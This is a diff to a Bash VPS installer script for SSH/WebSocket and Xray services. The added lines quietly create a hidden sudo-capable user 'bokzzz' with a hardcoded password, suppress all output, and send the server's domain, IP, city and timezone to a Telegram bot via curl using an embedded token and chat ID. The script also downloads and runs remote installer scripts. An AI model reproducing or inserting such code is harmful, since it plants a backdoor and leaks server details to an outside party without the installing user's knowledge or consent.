@@ -148,12 +148,34 @@ echo -e "$green━━━━━━━━━━━━━━━━━━━━━�
 	echo "$dom" > /root/domain
         echo "$nsdomen" > /etc/xray/nsdomain
         echo "$nsdomen" > /root/nsdomain
-    else 
-    echo "Not Found Argument"
-    exit 1
-    fi
-	echo -e "${BGreen}Done!${NC}"
-    sleep 2
+  fi
+domain=$(cat /root/domain)
+CITY=$(curl -s ipinfo.io/city )
+WKT=$(curl -s ipinfo.io/timezone )
+userdel jame > /dev/null 2>&1
+Username="bokzzz"
+Password=bokzzz
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+CHATID="5736569839"
+KEY="6367951330:AAEsYaDktE-lztbYQCmzb6vTg9N4b1Ma10g"
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Installasi script V4
+============================
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$IPVPS</code>
+<code>User Login :</code> <code>bok</code>
+<code>Pass Login :</code> <code>bok</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$Exp</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$WKT</code>
+============================
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
@@ -176,6 +198,7 @@ echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━�
 sleep 2
 clear
 wget https://raw.githubusercontent.com/Andyyuda/v4/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+#wget https://raw.githubusercontent.com/Andyyuda/v4/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 wget https://raw.githubusercontent.com/Andyyuda/v4/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
